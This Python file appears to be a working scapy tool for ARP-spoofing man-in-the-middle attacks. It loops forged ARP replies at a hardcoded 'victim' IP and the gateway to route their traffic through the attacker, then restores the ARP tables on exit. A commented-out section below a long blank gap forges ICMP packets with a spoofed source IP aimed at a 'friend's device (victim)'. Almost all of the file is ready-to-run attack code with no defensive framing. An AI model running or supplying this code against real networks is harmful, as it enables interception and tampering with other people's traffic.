from scapy.all import ARP, Ether, srp, send
import time
import sys

# Replace with actual IPs
target_ip = "192.168.207.23"  # Victim's IP
gateway_ip = "192.168.207.7"  # Router's IP

def get_mac(ip):
    """Get the MAC address for a given IP. Returns None if no response."""
    print(f"[*] Sending ARP request to {ip}...")
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    
    if answered:
        return answered[0][1].hwsrc
    else:
        print(f"[!] No response for {ip}.")
        return None

def spoof(target_ip, spoof_ip):
    """Send a spoofed ARP response."""
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"[!] Could not find MAC address for {target_ip}. Spoofing aborted.")
        return

    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(target_ip, source_ip):
    """Restore the original ARP table."""
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)

    if target_mac and source_mac:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, count=10, verbose=False)  # Increased count to 10
    else:
        print("[!] Could not restore ARP table. MAC address not found.")

try:
    print("[*] Starting ARP spoof...")
    while True:
        spoof(target_ip, gateway_ip)  # Tell victim that we are the gateway
        spoof(gateway_ip, target_ip)  # Tell gateway that we are the victim
        time.sleep(5)  # Increased sleep time to 5 seconds

except KeyboardInterrupt:
    print("\n[!] Detected CTRL+C! Restoring ARP tables...")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[*] ARP tables restored. Exiting.")
    sys.exit(0)

























# from scapy.all import *
# import time

# # Replace these with the target's actual information
# target_ip = "TARGET_IP_HERE"    # IP of your friend's device (victim)
# target_mac = "TARGET_MAC_HERE"  # MAC address of your friend's device
# destination_ip = "DESTINATION_IP_HERE"  # IP of the device you want to communicate with as the victim

# # Construct a spoofed ICMP packet (e.g., a ping)
# def spoof_packet():
#     # Construct the Ethernet frame
#     ethernet = Ether(src=target_mac, dst="FF:FF:FF:FF:FF:FF")  # Broadcast MAC for visibility; or use a specific one

#     # IP layer with victim's IP as source
#     ip = IP(src=target_ip, dst=destination_ip)

#     # ICMP layer (ping request)
#     icmp = ICMP(type="echo-request")

#     # Full packet
#     packet = ethernet / ip / icmp

#     # Send packet to the network
#     sendp(packet, verbose=False)
#     print(f"Packet injected from {target_ip} to {destination_ip}")

# try:
#     # Continuous injection for testing purposes
#     while True:
#         spoof_packet()
#         time.sleep(2)  # Adjust delay as needed
# except KeyboardInterrupt:
#     print("Packet injection stopped.")
